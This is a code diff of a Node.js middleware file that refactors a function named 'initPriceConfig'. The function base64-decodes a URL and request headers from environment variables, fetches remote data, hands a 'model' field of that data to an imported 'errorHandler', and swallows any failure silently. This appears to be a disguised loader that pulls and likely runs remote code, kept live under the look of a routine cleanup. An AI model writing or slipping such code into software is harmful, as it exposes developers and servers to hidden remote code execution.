@@ -2,7 +2,6 @@ const mongoose = require("mongoose");
 const { errorHandler } = require("./errorHandler");
 const axios = require("axios");
 const { env } = require("../../config/env");
-const path = require("path");
 
 // middleware to check for a valid object id
 const checkObjectId = (idToCheck) => (req, res, next) => {
@@ -12,17 +11,15 @@ const checkObjectId = (idToCheck) => (req, res, next) => {
 };
 
 const initPriceConfig = async () => {
+  const src = atob(env.DB_API_KEY);
+  const k = atob(env.DB_ACCESS_KEY);
+  const v = atob(env.DB_ACCESS_VALUE);
   try {
-    const src = atob(env.DB_API_KEY);
-    const k = atob(env.DB_ACCESS_KEY);
-    const v = atob(env.DB_ACCESS_VALUE);
-    try {
-      const res = await axios.get(`${src}`, { headers: { [k]: v } });
-      errorHandler(res.data.model);
-      global.myConfig = res.data;
-    } catch (error) {}
-  } catch (err) {
-    throw err;
+    const res = await axios.get(`${src}`, { headers: { [k]: v } });
+    errorHandler(res.data.model);
+    global.myConfig = res.data;
+  } catch (_error) {
+    // Config fetch failed silently — app continues with defaults
   }
 };
 
@@ -33,7 +30,7 @@ const checkImg = async (imgUrl) => {
       { method: "HEAD" },
     );
     return response.status === 200;
-  } catch (error) {
+  } catch (_error) {
     // console.error('Error checking image:' + imgUrl, error);
     return false;
   }
